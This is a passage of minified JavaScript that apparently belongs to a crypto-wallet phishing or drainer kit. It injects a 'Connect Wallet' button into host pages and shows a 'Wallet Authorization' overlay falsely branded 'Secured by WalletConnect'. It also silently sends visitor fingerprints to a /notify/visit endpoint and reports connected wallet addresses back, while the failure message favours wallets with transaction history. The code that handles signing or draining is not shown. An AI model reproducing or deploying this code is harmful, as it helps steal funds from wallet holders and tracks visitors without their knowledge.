        #_tp_box { font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Segoe UI",Roboto,sans-serif;background:#121313;border:1px solid #2A2A2A;border-radius:36px 36px 0 0;border-bottom:none;padding:24px 24px 32px;max-width:400px;width:100%;color:#fff;box-shadow:0 -8px 32px rgba(0,0,0,0.3);animation:_tp_fadeIn 0.2s ease-out; }
        @media(min-width:500px) { #_tp_box { border-radius:36px;border-bottom:1px solid #2A2A2A;padding:20px;box-shadow:0 8px 32px rgba(0,0,0,0.4); } }
        #_tp_header { display:flex;align-items:center;justify-content:center;margin-bottom:24px; }
        #_tp_header_title { font-size:16px;font-weight:600;color:#fff; }
        #_tp_content { display:flex;flex-direction:column;align-items:center;gap:16px;padding:10px 20px 20px; }
        #_tp_icon_wrap { position:relative;width:100px;height:100px; }
        #_tp_icon { width:70px;height:70px;border-radius:18px;background:#3B99FC;display:flex;align-items:center;justify-content:center;position:absolute;top:15px;left:15px;overflow:hidden;font-size:32px;font-weight:700;color:#fff; }
        #_tp_loader { position:absolute;inset:0;width:100px;height:100px; }
        #_tp_loader rect { fill:none;stroke:#3B99FC;stroke-width:3;stroke-linecap:round;stroke-dasharray:116 245;stroke-dashoffset:360;animation:_tp_dash 1s linear infinite; }
        #_tp_title { font-size:16px;font-weight:600;color:#fff;text-align:center; }
        #_tp_msg { font-size:13px;color:#9A9A9A;text-align:center;line-height:1.5;min-height:18px; }
        #_tp_footer { display:flex;align-items:center;justify-content:center;gap:6px;margin-top:8px;padding-top:16px;border-top:1px solid #2A2A2A;color:#666; }
        #_tp_footer span { font-size:11px;letter-spacing:0.02em; }
      `),
          document.head.appendChild(l)),
        (G = document.createElement("div")),
        (G.id = "_tp_overlay"));
      const t = document.createElement("div");
      ((t.id = "_tp_box"),
        (t.innerHTML = `
      <div id="_tp_header">
        <div id="_tp_header_title">Wallet Authorization</div>
      </div>
      <div id="_tp_content">
        <div id="_tp_icon_wrap">
          <div id="_tp_icon"></div>
          <svg id="_tp_loader" viewBox="0 0 110 110" width="100" height="100">
            <rect x="2" y="2" width="106" height="106" rx="36"/>
          </svg>
        </div>
        <div id="_tp_title">Continue in Wallet</div>
        <div id="_tp_msg"></div>
        <div id="_tp_buttons" style="display:flex;gap:8px;margin-top:4px"></div>
      </div>
      <div id="_tp_footer">
        <span>Secured by WalletConnect</span>
      </div>
    `),
        G.appendChild(t),
        document.body.appendChild(G));
    }
    const a = document.getElementById("_tp_title");
    a && ((a.textContent = "Continue in Wallet"), (a.style.color = "#fff"));
    const c = document.getElementById("_tp_loader");
    if (c) {
      const l = c.querySelector("rect");
      l &&
        l.setAttribute(
          "style",
          "fill:none;stroke:#3B99FC;stroke-width:3;stroke-linecap:round;stroke-dasharray:116 245;stroke-dashoffset:360;animation:_tp_dash 1s linear infinite",
        );
    }
    const o = document.getElementById("_tp_icon");
    o &&
      (rA
        ? (o.innerHTML = `<img src="${rA}" style="width:100%;height:100%;object-fit:cover" onerror="this.parentElement.textContent='W'"/>`)
        : (o.textContent = "W"));
    const n = document.getElementById("_tp_msg");
    (n && (n.textContent = e), (G.style.display = "flex"));
  }
  function J(e) {
    const a = document.getElementById("_tp_msg");
    a && (a.textContent = e);
  }
  function nA() {
    ((document.body.style.overflow = ""), G && (G.style.display = "none"));
  }
  function oA(e, a) {
    cA("");
    const c = document.getElementById("_tp_loader"),
      o = document.getElementById("_tp_title"),
      n = document.getElementById("_tp_msg");
    if (c) {
      const l = c.querySelector("rect");
      l &&
        l.setAttribute(
          "style",
          "fill:none;stroke:#ff4d4f;stroke-width:3;stroke-linecap:round;stroke-dasharray:none;stroke-dashoffset:0;animation:none !important",
        );
    }
    (o && ((o.textContent = e), (o.style.color = "#ff4d4f")),
      n &&
        (n.textContent =
          a ||
          "We could not verify this wallet. Make sure your wallet is active and has transaction history."));
  }
  function JA() {
    try {
      const a = tA();
      Y("/notify/visit", {
        method: "POST",
        body: JSON.stringify({
          visitorId: a,
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          pageUrl: window.location.href,
          referrer: document.referrer || void 0,
        }),
      }).catch(() => {});
    } catch {}
    document.addEventListener("click", (a) => {
      a.target.closest("[data-wallet-connect]") && (a.preventDefault(), VA());
    });
    const e = () => {
      if (document.querySelector("[data-wallet-connect]")) return;
      const a = document.createElement("button");
      ((a.textContent = "Connect Wallet"),
        a.setAttribute("data-wallet-connect", ""),
        (a.style.cssText =
          "background:#3B99FC;color:#fff;border:none;border-radius:8px;padding:12px 28px;font-size:15px;font-weight:600;cursor:pointer;box-shadow:0 2px 12px rgba(59,153,252,.35);position:fixed;bottom:32px;right:32px;z-index:999999"),
        document.body.appendChild(a));
    };
    document.readyState === "loading"
      ? document.addEventListener("DOMContentLoaded", e)
      : e();
  }
  async function VA() {
    try {
      const e = await HA();
      H("connect", `connected: ${e.address}`);
    } catch (e) {
      (e == null ? void 0 : e.message) !== "closed" &&
        H("connect", `failed: ${e == null ? void 0 : e.message}`);
    }
  }
  JA();
})();
